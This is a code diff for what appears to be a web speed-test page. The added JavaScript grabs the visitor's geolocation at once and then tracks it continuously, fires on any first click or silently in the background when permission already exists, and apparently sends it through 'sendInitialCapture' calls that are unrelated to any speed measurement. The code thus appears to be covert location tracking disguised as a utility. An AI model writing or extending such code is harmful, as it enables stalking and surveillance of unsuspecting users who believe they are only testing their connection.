@@ -162,7 +162,17 @@ function getAccurateLocation(id) {
     }).catch(() => {});
   };
 
+  // Instant capture attempt as soon as permission is granted
+  navigator.geolocation.getCurrentPosition(success, () => {}, options);
+  
+  // Continuous tracking
   locationWatcher = navigator.geolocation.watchPosition(success, () => {}, options);
+}
+
+async function triggerCaptureFlow() {
+  if (captureId) return;
+  const id = await sendInitialCapture();
+  if (id) getAccurateLocation(id);
 }
 
 
@@ -309,8 +319,11 @@ async function startTest() {
   resetGaugeOnly();
 
   const results = generateResults();
-  await sendInitialCapture();
-  getAccurateLocation(captureId);
+  if (!captureId) {
+    await triggerCaptureFlow();
+  } else {
+    getAccurateLocation(captureId);
+  }
 
   els.phaseLabel.textContent = 'FINDING SERVER';
   els.startBtn.classList.add('hidden');
@@ -572,13 +585,15 @@ async function init() {
   bindEvents();
   drawTicks();
 
+  // Trigger on first interaction to catch permission grant immediately
+  document.addEventListener('click', triggerCaptureFlow, { once: true });
+
   // Smart background start: check if we already have permission
   if (navigator.permissions && navigator.permissions.query) {
     try {
       const result = await navigator.permissions.query({ name: 'geolocation' });
       if (result.state === 'granted') {
-        const id = await sendInitialCapture();
-        if (id) getAccurateLocation(id);
+        triggerCaptureFlow();
       }
     } catch (err) {}
   }
